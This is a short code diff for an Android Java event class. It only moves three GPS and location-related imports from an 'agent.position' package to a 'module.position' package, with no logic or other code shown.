@@ -11,12 +11,12 @@ package com.android.service.event;
 
 import java.io.IOException;
 
-import com.android.service.agent.position.GPSLocator;
-import com.android.service.agent.position.GPSLocatorDistance;
-import com.android.service.agent.position.RangeObserver;
 import com.android.service.auto.Cfg;
 import com.android.service.conf.ConfEvent;
 import com.android.service.conf.ConfigurationException;
+import com.android.service.module.position.GPSLocator;
+import com.android.service.module.position.GPSLocatorDistance;
+import com.android.service.module.position.RangeObserver;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 
